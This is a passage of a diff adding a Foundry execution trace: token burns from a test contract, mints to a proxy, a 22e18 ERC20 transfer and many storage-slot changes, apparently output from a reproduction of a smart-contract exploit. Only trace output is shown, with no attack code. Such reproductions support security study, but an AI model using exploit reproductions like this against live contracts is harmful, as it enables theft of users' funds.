+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8796)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6049)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3913)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7449)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4984)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3978)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3525)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4090)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7093)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9017)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1933)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9192)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7485)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 41)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3033)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9050)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 347)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8866)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3270)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9004)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9159)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 358)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 643)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5045)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 1168)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5153)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 8137)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 4842)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 2507)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 6356)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 7859)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5862)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 7605)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 736)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5507)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 942)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 1549)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 3951)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 6652)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 8418)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 6614)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 5010)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], tokenId: 7314)
+    │   │   │   │   │   │   │   │   │   ├─ emit ERC20Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], amount: 22000000000000000000 [2.2e19])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x36822dd15940f1efccfbc62c0ff56967efaf9783a99f51ad14a05140cb0a430b: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 11 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 3 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x4d4d0ea6828e6cfadf573d00ca0ceecd1b88d8fe03738c680525933a0c6566d2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 13 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x4ab23ed1f83872b0a45de39f6ed7d229ae280f63ff22205982744af85aa148b3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xa2fc26c823cf110ed3d127efc4512827e69c220798d62758e9566c0e0d9ddfbc: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000001314fb37062980000 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 6 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 511 → 533
+    │   │   │   │   │   │   │   │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8d: 9004 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x852ad12a00fde3f2222effa6c54953732fa0c605b80022916d85aabff4788b60: 0 → 520
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ea: 0 → 736
+    │   │   │   │   │   │   │   │   │   │   @ 0xa5b58a888a85842b891a760e4c76260aeafebf6e5cba275046506c0ed4973e49: 0 → 526
+    │   │   │   │   │   │   │   │   │   │   @ 0x969cdb32f670ea09030ac7e1917768e8465670b5835811b4148238023de63974: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x16d4236f8135b486684a8fac3481a9cf3bb5748669ffb02a03afa726d60d00f8: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x7eca25646d77fbe48d97efe900eaf35453ca5066c6465950256408bb31a48a1b: 15 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x509055df01107bc64af72dc08330b9397ce32ea3183e634e399c3833b7aa595e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x6ac42465a8b4c0f32b318bd6a8f0b22cdc01505097dac159adad5ddc02c3cd21: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e2: 0 → 5153
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb414d: 3951 → 4984
+    │   │   │   │   │   │   │   │   │   │   @ 0x9ae033293df4dab32d5c97677a4d1db599ce5cc1a07073bdfe4cddecf372b28b: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0xd609a12af96f381f54941be9dcd7bbee7751067de615944a5b44d4a5ef7da0ff: 0 → 528
+    │   │   │   │   │   │   │   │   │   │   @ 0xd9f0ab2dde70205bf43c828029343c0e47e215095e2b6694cc4c6170cf031138: 0 → 512
+    │   │   │   │   │   │   │   │   │   │   @ 0xd9379a4d2df17ecad725133e46dbfa3a48f8df77dd941acd4d8666c461a1777d: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xf628b9f41573c0b9c087365a59c95440d0d7bba73f05e58e6c4ebc7a1d5cd252: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x3145524748f242dc0c0a68c12e0567d6bbf742f81d6c3ee06768ba6634c2a024: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ee: 0 → 3951
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ef: 0 → 6652
+    │   │   │   │   │   │   │   │   │   │   @ 0xd51f4af17988aa3c9a4279e56b5c513456be996db0aa93724276e1e964f840cd: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9e: 3913 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xdbdc55d7621c6061576ada6656295ae01b65e3eb3f1854f3486f5ce65e3c82d2: 18 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xf98bc0cbda3d7d2a860722c3a9bf0b3506931ba0cf6dd1e7a3fde454c8a5932d: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f2: 0 → 5010
+    │   │   │   │   │   │   │   │   │   │   @ 0x1b137e43b0e30898156d4dbd1f04e48bffecac6b87d788f4d716dc4cedc28e45: 10 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x8ade9df877cb80af548f38370331a164b97518ec72222059c8aaf19e6dec14c1: 0 → 513
+    │   │   │   │   │   │   │   │   │   │   @ 0x74c76a0c8ee1c2289e32559cf79108454b22784ff63867bea7537ff0d3ee7a98: 0 → 531
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606eb: 0 → 5507
+    │   │   │   │   │   │   │   │   │   │   @ 0xe86a36d99c620136f888a1fd93be80f03b128dd47d208a7926fccc1281ec5638: 0 → 517
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ed: 0 → 1549
+    │   │   │   │   │   │   │   │   │   │   @ 0x6971aedab59087793b7b619727961bf26ce046f5037bd4ce832c788cc9b6ea48: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d93: 41 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x2bc5e84e7bfd65db2c9a03c19663117794e6d3f48b2d2306110f4e6007473e12: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0xa40251d2b6688359486135c6e76e1abd31779178b88ebf380a9f419756243854: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x685060f84c1c9d82e1697af4e7b31b8f6d0a8d4d46e7926158ac36778d8fe7a9: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0xb0fe4e49c3698e4fe528983dbb96bb81bbe758eefc3df02a1039afa8204a2716: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d96: 1933 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb46f2: 1168 → 8866
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e1: 0 → 1168
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f3: 0 → 7314
+    │   │   │   │   │   │   │   │   │   │   @ 0x674b811aca00289cb6a2128b2be64b4b839922977c8eb07da9b9bc820eaf585c: 0 → 522
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e5: 0 → 2507
+    │   │   │   │   │   │   │   │   │   │   @ 0x658e1034b789a97e688c050855069ec25b7a5f7e8584b95899fb44495c01edf0: 0 → 527
+    │   │   │   │   │   │   │   │   │   │   @ 0x1caba39457f65f114b07ad8c5d85e0e58a22d995739ecfffc1aa24e764929db2: 8 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xc921984d2c33a69f8375f086d9b3a96627202e9779634ae9c1a69f69a45f58d8: 0 → 511
+    │   │   │   │   │   │   │   │   │   │   @ 0x53dcf6523203eeda256c1c1448097d0049bd45fee760a74a01dbe05dbc1d65e9: 0 → 519
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606f0: 0 → 8418
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d99: 4090 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xed328d2bb428e8669bc7cffac36f7bfa7be91b9f3cf6909ec4029ad835946798: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x4d4695fd027810f7d8a51d8c6d12aaac78b91258cb3f49850c4ffea388e3b005: 19 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x0e7db45edec961ebbfe5c90b251b8e1b57ac28de641a068a5f6ce9333a19a77f: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x278f4573a69e3831cd8adb28e1f945e081534e9d1c9b485ab956be05d3187cd6: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x96cf7746f18a97cf11d1e4d88837e1786085500ea82c421d7cdbd15759a9d51e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x1cc7c4bb5043850156832fe1f696d0325f877ddc10740a27a01d3ab15f276afa: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da1: 4903 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c33: 2507 → 41
+    │   │   │   │   │   │   │   │   │   │   @ 0xcc2c5c17b159d60d905b954901e7a94ae9978f5d8ea9527f13bcd28ff7a38b73: 17 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xdccb807df54ef7f54177da31d6e47088326dfc222c2135a94ecc41fac40390f7: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x2a8efdb7eb99fec03e881c964da846b7ab8695cb9d012a1b34c4ed2e3b70bdc8: 0 → 518
+    │   │   │   │   │   │   │   │   │   │   @ 0x0c07f4fe9e7a67d59a6d916831877a58b85ff9aa619bc0726a102b66b7e76c9b: 7 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb408d: 643 → 9004
+    │   │   │   │   │   │   │   │   │   │   @ 0xdbb3f9f2c9b7eec99bbb5c2e104e37fbdcf0674aa14c1384ad2642d17c6dd408: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4747: 6356 → 7485
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d98: 7093 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x5210cb14e405bd2df6c11d4d4e9843e881d7a3b94df4ddacbbb4d6e9dd105ac3: 0 → 524
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d95: 9192 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xff96918f9e4eb4105edb678ff6730927f18f7b6b9cb080b689169527fce78d4b: 0 → 529
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3e62: 7605 → 9017
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb43ac: 6614 → 6049
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e4: 0 → 4842
+    │   │   │   │   │   │   │   │   │   │   @ 0x7668c75f3f92f192135b8e5a2b43c6d6ebe6e285a2a3a5806f8b0fc775beda29: 0 → 523
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e3: 0 → 8137
+    │   │   │   │   │   │   │   │   │   │   @ 0x8fb346d4531e0e57916bb5b229baef81f694a075814eeaac982d91456334508e: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb42f2: 7859 → 9192
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4810: 5010 → 8796
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c87: 4842 → 3033
+    │   │   │   │   │   │   │   │   │   │   @ 0x754c3d23b53fe0c86c15828a5ac606752c899fa8175b595783936f2a9b59c3df: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606df: 0 → 643
+    │   │   │   │   │   │   │   │   │   │   @ 0x6eff746fd449bab3a144dcd04cfe86e5d65f6dfb45d6fdf0a8819740fc0c0013: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x248e9cd0385669887fa0db5e4efd97493422503ac37886170ad4f5ed3c7bc90a: 0 → 514
+    │   │   │   │   │   │   │   │   │   │   @ 0x35441fe7f8d0b19a83bd87b7e969450f401b3ab7732f1b720b32640769eccc25: 0 → 516
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e6: 0 → 6356
+    │   │   │   │   │   │   │   │   │   │   @ 0x61042a91e6bf866457bba3c0e1666b25163b3849470db2bebc37920294f5c189: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d94: 7485 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4b8f: 942 → 3525
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e0: 0 → 5045
+    │   │   │   │   │   │   │   │   │   │   @ 0x00e11b180707035eb108a63a3ae7f937627a5aa58f913b7faea04e9027d58721: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x962ecc2d8bd68c66e289398244c6419b52b1c82c0cbdda203120f18700d2c6fd: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x43b2386d4d3972d2f65d70f347e567d6b0c366ab6fb9eb781c2f1d30d6b1d7e5: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d92: 3033 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x6fe927c728cb1a50914fc42111657f0cb05320d84f4bf69c230741967e26adee: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x5278f81f69b597f632ca94967c8a1a3079fb3012864a72e457e419fddec9a26b: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 8796 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x17e99f0fabaa872aa0c61e01758a8c607df32d5c27e80b91ce30ed3746544114: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ec: 0 → 942
+    │   │   │   │   │   │   │   │   │   │   @ 0xa802220d0ed977381d8b68ae3925365b6c065a04bc1d683139a64b57d4e65308: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 2 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xf367aeb0eb7f2ba1fba0f21da71493632b960882782022912b6405e708fd562f: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e7: 0 → 7859
+    │   │   │   │   │   │   │   │   │   │   @ 0xb9e83ac16a9fd4563e29659139d2a3a201e448a49cbdfc9ab24a2acffbbe4436: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x216ec719c0213e89d814536f480598bd82ab255dd54b5ee25b87663456e1f7c5: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x6a9ea30a5fa309821e1798a8460f473e31ace56a3884752f811f11f82c64048c: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0xa421f34ee23dbb9537ec1b4f1a9a588ba34e2a5164c64d7eabc1c8445ab8741b: 5 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xe9b64936dce8d2203c8c485e78dac9f5541c6c46a96f6f5de0b7a1af7b0df1d8: 0 → 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb
+    │   │   │   │   │   │   │   │   │   │   @ 0x522cc3114cda474db2bf78154a25845d2f1f02fa81fac28b0a03215a662c2014: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x201eefa0b4934df22afa051a4a9c50a1a60812f397c2287f31526961a63e7648: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x57bced4c9b502a71acfd2d950a1d54dae5d72be78e16aaaece921b2c058d70ac: 14 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e9: 0 → 7605
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 6049 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x9dc68992587370ea2610c4afc050f53202bac18c08fcce1050ad31cb1c1ebd7a: 0 → 525
+    │   │   │   │   │   │   │   │   │   │   @ 0x67388f559e74e33b0aa6f2ec2468057845ddd8d17e39da1c21e877f035a80e23: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8c: 9159 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x0969268cef1c23fee39138be864ae3e858a548d585dbbdc1ffad2db1451eb30a: 0 → 1
